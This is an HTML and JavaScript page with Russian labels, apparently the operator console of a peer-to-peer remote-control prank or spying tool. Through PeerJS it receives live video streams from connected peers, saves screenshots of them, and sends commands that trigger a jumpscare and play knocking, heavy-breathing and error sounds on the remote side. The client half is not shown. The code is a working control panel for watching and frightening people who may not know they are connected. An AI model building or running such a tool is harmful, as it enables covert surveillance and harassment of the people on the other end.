<!DOCTYPE html>
<html>
<head>
    <title>TERMINAL v12</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
        #side { width: 300px; background: #0a0a0a; border-right: 2px solid #1a1a1a; padding: 20px; }
        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; background: #000; overflow-y: auto; }
        .v-box { border: 1px solid #333; position: relative; background: #111; }
        video { width: 100%; height: auto; display: block; }
        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 8px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; }
        .btn:hover { background: #0f0; color: #000; }
        #st { font-size: 18px; margin-bottom: 20px; color: #ff0050; }
    </style>
</head>
<body>
    <div id="side">
        <div id="st">● OFFLINE</div>
        <button class="btn" style="color:#ff0050; border-color:#ff0050;" onclick="send('SCR')">💀 СКРИМЕР</button>
        <button class="btn" onclick="takePhoto()">📸 СКРИНШОТ</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/error_CD7797S.mp3')">⚠️ ОШИБКА XP</button>
    </div>
    <div id="monitor"></div>

    <script>
        const peer = new Peer('SUPER_STABLE_99');
        let activeConn = null;

        peer.on('open', () => { document.getElementById('st').innerText = "● READY"; document.getElementById('st').style.color = "#0f0"; });
        peer.on('connection', c => { activeConn = c; document.getElementById('st').innerText = "● CONNECTED"; });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const div = document.createElement('div');
                div.className = 'v-box';
                const v = document.createElement('video');
                v.autoplay = true; v.srcObject = stream;
                div.appendChild(v);
                document.getElementById('monitor').appendChild(div);
            });
        });

        function send(t) { if(activeConn) activeConn.send({ type: t }); }
        function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
        function takePhoto() {
            const v = document.querySelector('video');
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const a = document.createElement('a'); a.download = 'shot.png'; a.href = canvas.toDataURL(); a.click();
        }
    </script>
</body>
</html>
